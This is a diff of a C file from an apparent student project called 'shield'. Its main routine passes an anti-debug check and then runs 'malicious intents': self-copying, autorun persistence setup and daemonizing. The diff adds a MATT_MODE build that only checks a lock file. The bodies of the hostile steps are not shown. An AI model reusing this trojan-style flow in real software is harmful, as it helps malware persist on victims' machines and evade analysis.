@@ -6,17 +6,38 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/05/24 19:14:01 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/07/17 02:05:25 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include <shield.h>
 #include <shield/daemon.h>
-#include "antidebug.inc.c"
 #include <stdio.h>
 #include <unistd.h>
+#include "antidebug.inc.c"
 
-#define LOGINS "kiroussa & lvincent\n"
+#if MATT_MODE
+#include <errno.h>
+#include <stdbool.h>
+#include <sys/stat.h>
+
+/**
+ * @brief	Check if a daemon is already running.
+ */
+static inline bool	shield_daemon_check(void)
+{
+	struct stat	s;
+
+	if (stat(DAEMON_LOCK_FILE, &s))
+	{
+		if (errno != ENOENT)
+			perror("stat");
+		return (errno == ENOENT);
+	}
+	puts("Daemon already running!");
+	return (false);
+}
+#endif // MATT_MODE
 
 /**
  * @brief	Malicious intents. 
@@ -30,12 +51,18 @@
  */
 static inline void	shield_malicious_intents(void)
 {
+#if MATT_MODE
+	DEBUG("matt_daemon_check\n");
+	if (!shield_daemon_check())
+		return ;
+#else // if !MATT_MODE
 	DEBUG("shield_copy\n");
 	if (!shield_copy())
 		return ;
 	DEBUG("shield_autorun_setup\n");
 	if (!shield_autorun_setup())
 		return ;
+#endif // !MATT_MODE
 	DEBUG("shield_daemonize\n");
 	shield_daemonize();
 	DEBUG("done\n");
@@ -62,8 +89,11 @@ int	main(void)
 	{
 		DEBUG("passed anti-debug check\n");
 		shield_malicious_intents();
-		DEBUG("malicious intents done\n");
+		DEBUG("done\n");
 	}
+#if !MATT_MODE
+#define LOGINS "kiroussa & lvincent\n"
 	(void)!write(1, LOGINS, sizeof(LOGINS));
+#endif
 	return (0);
 }
